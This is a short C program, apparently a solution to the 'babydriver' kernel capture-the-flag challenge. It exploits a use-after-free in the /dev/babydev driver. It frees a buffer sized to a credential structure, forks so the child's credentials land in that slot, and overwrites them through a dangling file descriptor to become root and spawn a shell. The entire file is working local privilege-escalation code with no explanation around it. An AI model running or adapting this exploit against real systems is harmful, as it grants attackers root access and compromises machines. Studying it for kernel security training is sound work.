#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>

#define ioctlparam 0x10001

int main(){
	int fd1=open("/dev/babydev",O_RDWR);
	int fd2=open("/dev/babydev",O_RDWR);
	ioctl(fd1,ioctlparam,0xa8);
	close(fd1);
	pid_t pid=fork();
	if(pid==0){
	/*child overwrites it's cred space to get LPE*/
		int payload[12]={0};
		write(fd2,payload,0x30);
		uid_t uid=getuid();
		printf("[+] new uid value=%d.\n",uid);
		if(uid==0){
		puts("[+] root!");
		system("/bin/sh");
		}
		else{
		puts("[!] Failed");
		}
		exit(0);
	}
	else if(pid>0){
	/*parent waits for child to complete execution*/
		puts("[+] Waiting for child.....");
		wait(NULL);	
	}
	else{
		perror("FORK FAILED!");
	}
	close(fd2);
}
